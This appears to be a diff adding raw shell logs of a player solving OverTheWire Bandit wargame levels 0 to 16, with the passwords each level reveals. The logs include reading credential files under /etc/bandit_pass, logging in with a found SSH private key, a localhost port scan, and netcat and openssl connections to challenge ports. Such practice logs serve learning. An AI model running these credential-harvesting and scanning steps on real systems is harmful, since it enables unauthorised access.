@@ -1,0 +1,938 @@
+bandit0@bandit:~$ ls
+readme
+bandit0@bandit:~$ cat readme 
+boJ9jbbUNNfktd78OOpsqOltutMc3MY1
+bandit0@bandit:~$
+
+bandit1@bandit:~$ pwd
+/home/bandit1
+bandit1@bandit:~$ ls -al
+total 24
+-rw-r-----  1 bandit2 bandit1   33 Dec 28 14:34 -
+drwxr-xr-x  2 root    root    4096 Dec 28 14:34 .
+drwxr-xr-x 29 root    root    4096 Dec 28 14:34 ..
+-rw-r--r--  1 root    root     220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 root    root    3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 root    root     655 Jun 24  2016 .profile
+bandit1@bandit:~$ cat /home/bandit1/- 
+CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+bandit1@bandit:~$
+
+bandit2@bandit:~$ ls -al
+total 24
+drwxr-xr-x  2 root    root    4096 Dec 28 14:34 .
+drwxr-xr-x 29 root    root    4096 Dec 28 14:34 ..
+-rw-r--r--  1 root    root     220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 root    root    3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 root    root     655 Jun 24  2016 .profile
+-rw-r-----  1 bandit3 bandit2   33 Dec 28 14:34 spaces in this filename
+bandit2@bandit:~$ cat /home/bandit2/spaces\ in\ this\ filename 
+UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+bandit2@bandit:~$
+
+andit3@bandit:~$ ls -al
+total 24
+drwxr-xr-x  3 root root 4096 Dec 28 14:34 .
+drwxr-xr-x 29 root root 4096 Dec 28 14:34 ..
+-rw-r--r--  1 root root  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 root root 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 root root  655 Jun 24  2016 .profile
+drwxr-xr-x  2 root root 4096 Dec 28 14:34 inhere
+bandit3@bandit:~$ cd inhere/
+bandit3@bandit:~/inhere$ ls -al
+total 12
+drwxr-xr-x 2 root    root    4096 Dec 28 14:34 .
+drwxr-xr-x 3 root    root    4096 Dec 28 14:34 ..
+-rw-r----- 1 bandit4 bandit3   33 Dec 28 14:34 .hidden
+bandit3@bandit:~/inhere$ cat .hidden 
+pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+bandit3@bandit:~/inhere$
+
+
+bandit4@bandit:~$ ls -al
+total 24
+drwxr-xr-x  3 root root 4096 Dec 28 14:34 .
+drwxr-xr-x 29 root root 4096 Dec 28 14:34 ..
+-rw-r--r--  1 root root  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 root root 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 root root  655 Jun 24  2016 .profile
+drwxr-xr-x  2 root root 4096 Dec 28 14:34 inhere
+bandit4@bandit:~$ cd inhere/
+bandit4@bandit:~/inhere$ ls
+-file00  -file01  -file02  -file03  -file04  -file05  -file06  -file07  -file08  -file09
+bandit4@bandit:~/inhere$ ls -al
+total 48
+-rw-r----- 1 bandit5 bandit4   33 Dec 28 14:34 -file00
+-rw-r----- 1 bandit5 bandit4   33 Dec 28 14:34 -file01
+-rw-r----- 1 bandit5 bandit4   33 Dec 28 14:34 -file02
+-rw-r----- 1 bandit5 bandit4   33 Dec 28 14:34 -file03
+-rw-r----- 1 bandit5 bandit4   33 Dec 28 14:34 -file04
+-rw-r----- 1 bandit5 bandit4   33 Dec 28 14:34 -file05
+-rw-r----- 1 bandit5 bandit4   33 Dec 28 14:34 -file06
+-rw-r----- 1 bandit5 bandit4   33 Dec 28 14:34 -file07
+-rw-r----- 1 bandit5 bandit4   33 Dec 28 14:34 -file08
+-rw-r----- 1 bandit5 bandit4   33 Dec 28 14:34 -file09
+drwxr-xr-x 2 root    root    4096 Dec 28 14:34 .
+drwxr-xr-x 3 root    root    4096 Dec 28 14:34 ..
+bandit4@bandit:~/inhere$ cat -A /home/bandit4/inhere/-file0
+cat: /home/bandit4/inhere/-file0: No such file or directory
+bandit4@bandit:~/inhere$ cat -A /home/bandit4/inhere/-file00
+yk^_^\C6qM-^[+M-@M-?M-^RzM-^CC|M-,M-aM-^\^PM-^LMM-5^IM-^LrkAM-oM-uM-jM-IAbandit4@bandit:~/inhere$ cat -A /home/bandit4/inhere/-file01
+M-S^OM-<M-xM-^]LM-P^L^PM-*M-bM-^@]M-BSNM-BM-^Y^ZM-`M-7^E^B^S^Wr+M-tlM-`M-V2M-gbandit4@bandit:~/inhere$ cat -A /home/bandit4/inhere/-file02
+M-?iM-EM-^D:5M-^?M-!^DM-k^_mp^W6M-qW^W{M-r^L/M-/^KM-^DM-^DM-^QM-^UM-$^V%M-mRbandit4@bandit:~/inhere$ cat -A /home/bandit4/inhere/-file03
+M-QOM-^O^PM-^P,-M-^^LM-+M-WM-AM-[tM-uM-*M-^NTM-ZM-qWM-^YM-#LvM-^O<dM-VM-JM-E3qbandit4@bandit:~/inhere$ cat -A /home/bandit4/inhere/-file04
+M-^\^L&M-^L=M-^[_M-|M-^R`M-IM-^]M-^RmM-$=M-^J`M-.^?VM-!zsM-d9)^HM-yM-mM-1_bandit4@bandit:~/inhere$ cat -A /home/bandit4/inhere/-file05
+oM-KM-^TM-7M@M-^^Z^?M-2M-xM-^NM-,M-)M-s^SM-,^B^NM-.M-wM-9VM-FM-^J\%M-^L^UM-sM-^P+M-^Nbandit4@bandit:~/inhere$ cat -A /home/bandit4/inhere/-file06
+M-&!^CG^R kTM-u8^VM-lM-KM-CM-^Uxj^BM-^NysM-|M-FM-5^^M-^TM-JM-^QjM-jM-.M-%Obandit4@bandit:~/inhere$ cat -A /home/bandit4/inhere/-file07
+koReBOKuIDDepwhWk7jZC0RTdopnAYKh$
+bandit4@bandit:~/inhere$
+
+ls -alR | grep 1033
+-rw-r-----  1 root bandit5 1033 Dec 28 14:34 .file2
+bandit5@bandit:~/inhere$ cat maybehere07/.file2
+DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+
+andit6@bandit:/$ find / -mindepth 1 -name bandit7.password
+find: '/etc/ssl/private': Permission denied
+find: '/etc/polkit-1/localauthority': Permission denied
+find: '/run/lxcfs': Permission denied
+find: '/run/user/11019': Permission denied
+find: '/run/user/11022': Permission denied
+find: '/run/user/11010': Permission denied
+find: '/run/user/11009': Permission denied
+find: '/run/user/11008': Permission denied
+find: '/run/user/11004': Permission denied
+find: '/run/user/11003': Permission denied
+find: '/run/user/11001': Permission denied
+find: '/run/user/11007': Permission denied
+find: '/run/user/11002': Permission denied
+find: '/run/user/11012': Permission denied
+find: '/run/user/11024': Permission denied
+find: '/run/user/11020': Permission denied
+find: '/run/user/11015': Permission denied
+find: '/run/user/11021': Permission denied
+find: '/run/user/11026': Permission denied
+find: '/run/user/11025': Permission denied
+find: '/run/user/11016': Permission denied
+find: '/run/user/11014': Permission denied
+find: '/run/user/11011': Permission denied
+find: '/run/user/11017': Permission denied
+find: '/run/user/11013': Permission denied
+find: '/run/user/11000': Permission denied
+find: '/run/user/11005': Permission denied
+find: '/run/sudo': Permission denied
+find: '/run/log/journal/0d8e66480c320675a338622759f86ace': Permission denied
+find: '/run/lvm': Permission denied
+find: '/run/systemd/inaccessible': Permission denied
+find: '/run/lock/lvm': Permission denied
+find: '/dev/mqueue': Permission denied
+find: '/dev/shm': Permission denied
+find: '/lost+found': Permission denied
+find: '/root': Permission denied
+find: '/opt/splunkforwarder/etc/auth': Permission denied
+find: '/opt/splunkforwarder/etc/apps/learned/local': Permission denied
+find: '/opt/splunkforwarder/var': Permission denied
+find: '/home/bandit5/inhere': Permission denied
+find: '/var/log': Permission denied
+find: '/var/lib/puppet': Permission denied
+find: '/var/lib/apt/lists/partial': Permission denied
+/var/lib/dpkg/info/bandit7.password
+find: '/var/lib/polkit-1': Permission denied
+find: '/var/spool/rsyslog': Permission denied
+find: '/var/spool/bandit24': Permission denied
+find: '/var/spool/cron/atspool': Permission denied
+find: '/var/spool/cron/atjobs': Permission denied
+find: '/var/spool/cron/crontabs': Permission denied
+find: '/var/crash': Permission denied
+find: '/var/tmp': Permission denied
+find: '/var/cache/apt/archives/partial': Permission denied
+find: '/var/cache/ldconfig': Permission denied
+find: '/tmp': Permission denied
+find: '/sys/fs/fuse/connections/39': Permission denied
+find: '/sys/kernel/debug': Permission denied
+find: '/proc/tty/driver': Permission denied
+bandit6@bandit:/$ cat var/lib/dpkg/info/bandit7.password 
+HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+bandit6@bandit:/$
+
+bandit7@bandit:~$ ls
+data.txt
+bandit7@bandit:~$ grep millionth data.txt 
+millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+bandit7@bandit:~$
+
+bandit8@bandit:~$ sort data.txt | uniq -u
+UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+bandit8@bandit:~$
+
+andit9@bandit:~$ cat -A data.txt | grep '==='
+(M-^M-MM-^]M-'^MM-@M-TCM-HM-^UM-pM-2VM-^GY8M-^H{M-hM-4yM-^VM-OSHuM-uM-MM-bM-lM-4M-^JM-^^M-NM_RM-`^FM-^TM-^GFM-^AYM-xM-*M-CM-EM--M-}M-#M-ZKYM-^_pd?M-bM-j+M--KM-,^BM-UM-ON#1M-sb^MBM-p40M-fj`+M-^UM-FM-^M-^YQM-^Sx2M-^MdoM-FM-^GxpM-imM-^J;^R9M-.M-^S^M-x!M-^XM-%M-^B^_M-BM-^@_yjM-upM-OM-^?M-J>>7M-^_M-^FkM-HM-#M-I^MD+0M-V^BwM-h^OtxM-DM-(hzM-2========== theP`M-*M-%^_dM-LM-TM-^DM-^?M-,H^ZM-^[JAM-o]M-uM-^EM-^]M-bM-3~~UM-NM-g^VwM-^^kM-mM-^@M-^R>M-+EM-^YM-ttM-2YM-ZM-9GM-PM-d^RAM-AM-EM--z^H0M-^MM-}M-vV^R^LM-8M-w^T+F#M-SEM-^Y^KM-EM-mR^\^I^VM-kM-^DDM-^T^OM-n^CM-lM-kM-^OM-^M-M^QM- M-LXM-TCmM-o9P%jM-pM-EM-^?WM-PM-^OM-bM-Du^WM-\M-6^X^UY^GM-^?RM-^TM-^QM-:^QxM-J5^EM-EM-0M-^QM-uM-+M-3M-uM-^ZM-iM-^LM-uz,zM-^[HXvM-^@M-i"]M-^WM-n^T^F1^AM-MNTM-/^UM-pE^W#M-hM-dM-^X)M-MM-=BM-^]O=M-4RrCM-l~_M-^S$M-FM-?*M-'M-o+*M-^KM-rM-4M-A^GM-@M-rM-^NM-!M-gM-'M- JsM-LM-vye^NS^G^UM-^]a]TM-2M-tM-rM-(M-^KM-^KM-^[M-4M-^GM-pXM-)[cM-)5GM-/LM-JrM-y7M-^RM-KM-$^ZM- M-9M-^@}O^@M-DM-AM-|M-^ZM-O^XM-h!M->M-vH9tM-$nM-^BF M-=YM-kM-HM-QM-yRM-#M-1M-^SM-^[M-bM-|^O@M-\M-^B^YsRM-FM-CM-q](M-^\XM-^?M-^P!^RaM-DM-\M-^ZD3M-^@/M-iM-.M-^LM-^JbOKM-/M-qM-KM-T^XM-iM-SM-^H7M-^?M-=>M-^OM-^BM-C-M-,M-lM-@F^A;^F M-5M-^EM-3M-^R*uM-^C^H^M^?0)M-3M-^\H M-ILM-UM-^JM-bTM-^M-T^HM-eAJM-^L^\M-iM-KM-OM-^_^^M-4i^C=M-&}M-BM-/M-#M-nM-MM-,$M-CM-=M-qM-1M-vM-^GM-^VYM-{M-GM-IM-CM-^Yuv~M-^E-M->M-9M-a`^PM-^ZM-sM-^GfM-^QkPB&,6gHcM-xsGM-xM-^N!MM-=M-)M-(M-cM-AF[M-^OM-iM-MM-8M-GM-pJM-4^Zs^LM-+M-:3M-DM-vM-gt^\^LM-^OM-H^VM-^\M-^NM-M~pHM-^J^WM-DM-"M-^hM-6M-GM-#M-%^]3hM-p^@M-^^QM-=M-H^_M-^Q8M-H]^C1M-)YF>bM-^W'M-1w(MM-^Q~M-,M-n(^TM-^YAM-5DHM-uVM-fYM-,M-o7M-|^Wx?M-^U^fCoM-IM-^__xM-^BM-^M2^RfM-^PM-!^WKM-SZM-tM-3^YM-r>M-^[M-9o^Z^DM-Z0M-1M-.^SM-eO^A;HGM-^XM-^IMM-^U^VM-KM-]M-SM-EM-=M-g^UM-9qM-8M-^?M-;m:^A^Z_#M-^AsM-hM-1M-FM-1M-^QM- M-z_u{^^M-yfM-R^B^NM-#Jc^H^SM-9 M-^TM-^RnM-V^C^?M-sM-^[M-RM-D^IM-XM-^XPM-QM-^UM-^OM-N^OwM--M-$"M-^DM-^C^^S4M-C+^EM-,(/M-^ZM-K:]^R&M-xM-IM-^QM-|[M-&M-c^I;^^M-%M-:DM-_LM-UM-^^M-^M-^OM-^HrM-^_M-bM-^BM-!M-xv]M-DM-"M-am-M-^EoM-XM-G[bM-@M-+_M-^LM->^AM-1^DM-^U6K,"CM-<M-~^UrM-bM-8JM-V'M-9#M-^SdM-mM-^P+pp^MN7M-+M-OM-^ZM-gM-^EM-^I#M-evM-LuM-5M-;*M-^O^UM-6?M-^VM-'M-4M-i^W\5M-"aM-6M-uM-lBfbM-PM-B^WM-^WM-<oM-^F^_M-U^KM-^K^YM-=M-Be^Ov*^KM-}|^D^I*M-^YM-WMQSE%dM-^~^UM-[M-_M-~M-LM-^R1MM-uM-^@;CM-2zM-T^RM-]M-^]^Hlgp9M-fM-tTM-MM-Y0M-^PM-^LM-hM-;[M-=e^XM-456M-zM-QCM-OM-^IM-!BM-@^]=pM-^HM-=^V0M-<7M-^KjM-^BM-]^K+@M-'eOM-^UM-m^^M-^S^O^N"M-nM-pM-n?M-RM-^PM-8M-XaIzM-mM-Mcq^C,M-^_7r+M-+{]M-#1M-k~^?M-`M-XM-X^EM-YinRM-N^M^_M-;(WM-^@M-GfP[xM-^SGM-^QuM-^Npb [^TM-|M-^R6M-dQM-r^NM-4$
+M-m L^HM-^U:M-tM-\M-^J5M-vM-^^t6tM-0M-NM-^]#^GM-bM-^K!M-ZM-^GM-}M-rGM-U^Mc8bM-^RM-bM-^P._.M-l<M-VM-#M-_^O}w^]`M-vwM-!{M-<M-^A^VM-EM-CM-XM-UM-pM-2M-<`M-^YM-^RM-+z~'M-kM-^[M-_M-=M-aM-dRM-VM--^G'M-sM-YM-tM-^BM-{"^M~sM-jM-^Q"rM-^?M-Y0M-Y^V^UFM-^VM-1M-^@^KM-c^[t(^TM-^[}^?M-^@^PM-nM-^KM-^[M-)*^XQe!M-^KjUM-^V^YM-[^KM-l>M-w^^X^PM-iM-NM-;^T^WM-^J^DM-<GM-2wM-5^AM-9zM-2J^_M-1M-unM-eM-7M-HM-^I^TM-M\<P5J7=^M-,M-^XHD^P^B\jM-^CM-^XM-wM-LM--.M-zM-vM-,M-eM-sM-6awA^Gj0M-^?6$M-AOM-w^?M-^WM-h^R4^V`:*M-[M-IUM-AVM-hM-aM-LvM-yM-.^SGAM-!M-U1Q|uM-.M-pM-$M--M-m^NKpM-lpM-GM-nM-^]1GM-vM-CM-<M-\M-w^BmM-cPM-^NM-^DM-^_M-fM-VRiM-^[M-^AM-h========== passwordM-LM-2M-E.3M-2M-^^DM-}U^K^N&#bM-ax,M-CM-#M-JM-`M-i^Ni^M-3LrM-OM-Y`M-^IM-|M-OxM-d bM-CM-^\^?t.M-&M-.~M-^FM-AM-m/M-KM-VM-X*M-^T^OGM-1M-I)M-YM nM-s,^T#M-'*M-;^SM-v}0M-^VJ^\M-KoWs^^^Nf*^EM-$DM-Z0M-\M-ruM-MM-taM-^FM-s`F^\M-^Y'M-tM-^XM-cgcM-|#M-mM-^BM-YM-`=M-^M- M-5^V20KK^CM-^QgM-6M-NM-wM-^?M-^VHM-2M-eM-(M-aM-EM-yM-^HM-h`kM-^I^N^Fl#^InM-}M-!^KM-SM-b^EM-^QfU^X=M-RM-U]M-ubM-^AM-^^^MM-6M-AM-EXs,uq>i!q^\M-PM-WM-tM-v&.WM-SM-HxM-9`M-h8>~M-@_M-TM-^H^PM-6L{?-]M-.8^^M-8eM-^]_h;5M-L1^W^Ua,M-O!UM-^I,M-^IM-1M-R:M-<4M-:M-i^SM-^?M-HM-^B^D^^@1M-ZM-ZiM-<M-dM-^[xM-gyM-=;M-9M-EM-5M-\^Z[{M-VM- g\NM-$^EM-hM-cL6M-7^NM- ^CcM-oM-(M-v^AM-JM-o^H<!M-RC<M-^B^KM-o^[M-}M-^RM-vX^S.^NM-^\M-$M-i^SM-=:M-CM-M^^IM-vQM-8M--^TM-_M-:M-:M-^ZM-ZM-5M-^RM-,M-2T'M-/^QM-eM-ZM-^IM-dM-5^L|M-G^P-M-:VVM-JM-^M-6),M-qM-yWWM--M-^[gM-^LM-^]M-^M-kM-^PM-3M-EXM-w^_nM-kM-XM-6M-DM-^CLM-y6M-tM-^]M-y;.=M-YM-yM-YM-^NM-GM-^^M-^JM-GM-#]M-pM-mM-`M-QE^DtmM-QM-~M-9(M-OxTM-LM-C}-QM-(M-qM-^LM-mM-<^_M-GM->M-fM-1M-^CSM-^YM-^BM-t^FM-^W^]M-KM-wM-BCM-cFM-ffM--L8p^PM-SM-|M-8GM-cM-^PYM-WM-]C^TM-+M-CIM-^GM-VM-~M-\M-:,M-eM-^CM-pM-^BM-pM-5M-XM-rM-1C:M-^C^@M-^OM-c\^A&)^UM-HM-8M-kM-}!M-d^AM-pnM-^HM-EusM-^MM-LrM-^WnM-lkz^]M-KzU@gcM-'M-rbM-7U:{-M-sM-0^MM-,M-^BM-4M-FM-VM-/^ZM-lM-_,T^MkFNn^HMM-8M-cM-+M-EMM-^NM-^DO4M-^MM-^MM-^NM-HM-~^O$]7FJ@iM-^LOh^C1YM-PM-5M-:^?M-JM-gM-q1M-8M-^UM-@^V&SfM-^B^F^?@aM-vM-^VM-WM-~2M-^GM-^JM-^UM-^GvM-jM-^?gM-^_jLM-eM-FM-^N)/M-6[]M-MM-^SM-a8lM-oM-^CM-B$M-^[M-^@M-^Ke^V]rM-.0M-@8FM-^_M-7=xM-^HM-:M-VM-nM-^AM-[M-^HM-^LTM-^RM-JfM-2%I:M-8M-'M-OM-WjTM-& 4TM-[_M-^PQM-4^P^ATM-BM-<}M-?M-^Q^TM-$^UM-tM->M-Y^EM-^PM-c@^\^]M-^@M-"M-^HM-RM-^RjM-^KN^D^HqFHM-^MM-^R^LM-^D"M-.M-mM-_M-=/EM-|M-~sM-^DM-%M-^P_F^ZtM-r^BM-g^AM-<M-C-^ZM-CM-`M-^P5M-<7M-0^XM-^RiM-^YM-^U4M-^\^M-D^?EM-[M-$dZ/M-Z$
+,2^O^@M-@*T}J)'?M--M-^PM-A^M-^[aM-^LM-^L========== isAM-rM-I6M-t^YrM-^\g'GM-^UM-^LM-+M-^JM-HM-^^y1M-kaM-vM-`M-=M-&QM-SM-g9eM-:^NM-^LdYM-tG RM-^\KM-kM-lM-w^TM-iM-gM-U^KM-^[^\NM-^^M->M-3NM-KM-+M-QM-{^R+M-v^H4M-^NM-^EM-^VM-^WM-^DUM-^KaM-;^EM-'IM-YM-jM-^M)M--nD&M-T%^Gv^FA^EF?mjsM-uM-yFM-^M*M-^^P^_:^W$
+^Y@$2^BM-KM-<9M-yRGrM-aM-1'M-^_M-r5M-WM-^^osM-^I_M-eM-Wx^X^PM-^KM-^Zg,hdM-4M-^EM-^\M-:<M-k2M-^FM-mM-^_M-^JM-;<$p(M-2M-WM-^O7M-u^IM-]^RM-L^RM-jM-^LM-1~0M-^VDM-^^[M-BM-^MM-^TM-^L^Z^^?M-^O$M-4iM-^LM-#}+MV 9~M-eM-^[M-^JM-DM-&M-#M-8\;^IM-pM-)M-u^UIu)d9[M-LM-^?SM-yM-^WIM-7^SxM-1sBM-ZB^D^D?M-%^SM-^S^CM-vM-eM-^^M-lM-AM-qM-^PM-^H(M-^PcM-`^MM-X9=!/"^[M-^DM-PM-^DlM-fM-!M-:M-O^DM-`M-w~aM-YM-mM-tM-WM-|M-^J.+,1uM-^U^VM-\M-]M-^E gM-^[p^SM-fM-^I#M-^RQ^OM-^LM-^VM-^CM-\aM-d^R^K]M-Q^KM-^OM-}mM-w.M-XM-{M-vfM-I^LM-^RM-hxTM-5^RM-mP^QM-lM-}M-z8M-LM-3a^[ZdM-!M-E^VXM-+M-hM-^GM-^_^PM-jM-pG)M-$M-4M-)M-MM-0M-~^^ziM-o/g;.9M-^JM-~M-^]========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk$
+bandit9@bandit:~$
+
+bandit10@bandit:~$ ls
+data.txt
+bandit10@bandit:~$ file data.txt 
+data.txt: ASCII text
+bandit10@bandit:~$ cat data.txt 
+VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==
+bandit10@bandit:~$ man base64
+bandit10@bandit:~$ base64 -d data.txt 
+The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+bandit10@bandit:~$
+
+bandit11= The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+ython 3.5.3 (default, Jan 19 2017, 14:11:04) 
+[GCC 6.3.0 20170118] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import codecs
+>>> print(codecs.encode("hello", "rot-13"))
+uryyb
+>>> print(codecs.decode("Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh", "rot-13"))
+The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+>>> 
+
+bandit12@bandit:/tmp/jeremiah$ file jobby 
+jobby: POSIX tar archive (GNU)
+bandit12@bandit:/tmp/jeremiah$ mv jobby jobby.tar
+bandit12@bandit:/tmp/jeremiah$ tar -xvf jobby.tar 
+data5.bin
+bandit12@bandit:/tmp/jeremiah$ file data5.bin 
+data5.bin: POSIX tar archive (GNU)
+bandit12@bandit:/tmp/jeremiah$ mv data5.bin data4.tar
+bandit12@bandit:/tmp/jeremiah$ tar -xvf data4.tar 
+data6.bin
+bandit12@bandit:/tmp/jeremiah$ file data
+data: cannot open `data' (No such file or directory)
+bandit12@bandit:/tmp/jeremiah$ file data6.bin 
+data6.bin: bzip2 compressed data, block size = 900k
+bandit12@bandit:/tmp/jeremiah$ bzip2 data6.bin 
+bandit12@bandit:/tmp/jeremiah$ ls
+data.txt  data1  data4.tar  data6.bin.bz2  jobby.tar
+bandit12@bandit:/tmp/jeremiah$ file data6.bin.bz2 
+data6.bin.bz2: bzip2 compressed data, block size = 900k
+bandit12@bandit:/tmp/jeremiah$ bzip -d data6.bin.bz2 
+No command 'bzip' found, but there are 20 similar ones
+bzip: command not found
+bandit12@bandit:/tmp/jeremiah$ bzip2 -d data6.bin.bz2 
+bandit12@bandit:/tmp/jeremiah$ ls
+data.txt  data1  data4.tar  data6.bin  jobby.tar
+bandit12@bandit:/tmp/jeremiah$ bzip2 -d data6.bin
+bzip2: Can't guess original name for data6.bin -- using data6.bin.out
+bandit12@bandit:/tmp/jeremiah$ file data6.bin.out 
+data6.bin.out: POSIX tar archive (GNU)
+bandit12@bandit:/tmp/jeremiah$ mv data6.bin.out data6.tar
+bandit12@bandit:/tmp/jeremiah$ tar -xvf data6.tar 
+data8.bin
+bandit12@bandit:/tmp/jeremiah$ file data8.bin 
+data8.bin: gzip compressed data, was "data9.bin", last modified: Thu Dec 28 13:34:36 2017, max compression, from Unix
+bandit12@bandit:/tmp/jeremiah$ mv data8.bin data8.gz
+bandit12@bandit:/tmp/jeremiah$ gunzip data8.gz 
+bandit12@bandit:/tmp/jeremiah$ ls
+data.txt  data1  data4.tar  data6.tar  data8  jobby.tar
+bandit12@bandit:/tmp/jeremiah$ file data8
+data8: ASCII text
+bandit12@bandit:/tmp/jeremiah$ cat data8 
+The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+bandit12@bandit:/tmp/jeremiah$
+
+
+andit14@bandit:~$ exit
+logout
+Connection to localhost closed.
+bandit13@bandit:~$ ls
+sshkey.private
+bandit13@bandit:~$ ls -al
+total 24
+drwxr-xr-x  2 root     root     4096 Dec 28 14:34 .
+drwxr-xr-x 29 root     root     4096 Dec 28 14:34 ..
+-rw-r--r--  1 root     root      220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 root     root     3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 root     root      655 Jun 24  2016 .profile
+-rw-r-----  1 bandit14 bandit13 1679 Dec 28 14:34 sshkey.private
+bandit13@bandit:~$ nmap localhost 
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2018-05-10 17:23 CEST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00023s latency).
+Other addresses for localhost (not scanned): ::1
+Not shown: 996 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+113/tcp   open  ident
+8089/tcp  open  unknown
+30000/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
+bandit13@bandit:~$ ssh -i /home/bandit13/sshkey.private bandit14@localhost 
+Could not create directory '/home/bandit13/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)?
+
+ost is up (0.00021s latency).
+Other addresses for localhost (not scanned): ::1
+Not shown: 996 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+113/tcp   open  ident
+8089/tcp  open  unknown
+30000/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
+bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+bandit14@bandit:~$ man nc
+bandit14@bandit:~$ nc -p 3000
+This is nc from the netcat-openbsd package. An alternative nc is available
+in the netcat-traditional package.
+usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
+          [-P proxy_username] [-p source_port] [-q seconds] [-s source]
+          [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
+          [-x proxy_address[:port]] [destination] [port]
+bandit14@bandit:~$ nc localhost:3000
+This is nc from the netcat-openbsd package. An alternative nc is available
+in the netcat-traditional package.
+usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
+          [-P proxy_username] [-p source_port] [-q seconds] [-s source]
+          [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
+          [-x proxy_address[:port]] [destination] [port]
+bandit14@bandit:~$ nc localhost:30000
+This is nc from the netcat-openbsd package. An alternative nc is available
+in the netcat-traditional package.
+usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
+          [-P proxy_username] [-p source_port] [-q seconds] [-s source]
+          [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
+          [-x proxy_address[:port]] [destination] [port]
+bandit14@bandit:~$ netcat localhost 30000
+
+Wrong! Please enter the correct current password
+bandit14@bandit:~$ netcat localhost 30000
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+Correct!
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+
+bandit14@bandit:~$
+
+bandit15@bandit:~$ openssl s_client -ign_eof -connect localhost:30001
+No client certificate CA names sent
+---
+SSL handshake has read 1015 bytes and written 631 bytes
+---
+New, TLSv1/SSLv3, Cipher is AES128-SHA
+Server public key is 2048 bit
+Secure Renegotiation IS supported
+Compression: NONE
+Expansion: NONE
+No ALPN negotiated
+SSL-Session:
+    Protocol  : TLSv1
+    Cipher    : AES128-SHA
+    Session-ID: 06042AB394396D5442F5064BD899D55ED297667C748708BF04958213DA953F13
+    Session-ID-ctx: 
+    Master-Key: 6295D9A3EF140625577267ABDF56C6AD0A775266544A0138E649C96D866764FEE8A90282D3886B2ACAB3459E7B4EC21D
+    Key-Arg   : None
+    PSK identity: None
+    PSK identity hint: None
+    SRP username: None
+    TLS session ticket lifetime hint: 7200 (seconds)
+    TLS session ticket:
+    0000 - 08 f0 15 a5 d6 6f a0 e8-06 d6 bb a4 0c 33 eb 04   .....o.......3..
+    0010 - a2 68 d6 1f 9d 00 66 4a-27 3d b8 ed e6 2c 14 8c   .h....fJ'=...,..
+    0020 - 7e a1 32 e7 65 47 b5 d5-8c 42 4a a1 45 47 4d e6   ~.2.eG...BJ.EGM.
+    0030 - 07 f6 d7 13 a0 2d 25 ee-e4 01 29 7b f4 2d 72 9c   .....-%...){.-r.
+    0040 - b5 40 94 da 3f 0d cb 9f-36 a5 c7 c0 ad 28 ed bd   .@..?...6....(..
+    0050 - 72 1f ef 4f 02 f2 22 60-31 e7 70 2d 43 a4 43 35   r..O.."`1.p-C.C5
+    0060 - 0b 7a 6a 6e 41 ad 52 e0-14 70 57 91 a7 27 6e 0c   .zjnA.R..pW..'n.
+    0070 - bf 57 bf 98 bf 55 77 7a-3b 91 a4 ad a5 06 a5 de   .W...Uwz;.......
+    0080 - 71 98 f8 9d 96 74 39 a9-6c 7a 9b 4d ba f7 59 8a   q....t9.lz.M..Y.
+    0090 - 5c 0d 06 79 4e 5e 48 94-a0 ef e3 b3 91 65 7d f0   \..yN^H......e}.
+
+    Start Time: 1525968036
+    Timeout   : 300 (sec)
+    Verify return code: 18 (self signed certificate)
+---
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+Correct!
+cluFn7wTiGryunymYOu4RcffSxQluehd
+
+closed
+
+bandit16@bandit:~$ openssl s_client -ign_eof -connect localhost:31790
+
+  0040 - 72 b4 7c 35 cc b5 37 45-75 20 19 e1 6a 6e 60 4c   r.|5..7Eu ..jn`L
+    0050 - a4 81 89 f7 39 d8 19 8f-81 8a 38 fb 07 85 ab a9   ....9.....8.....
+    0060 - 41 da 73 14 f2 cd d0 f7-03 d8 d5 c8 2a f4 7b d4   A.s.........*.{.
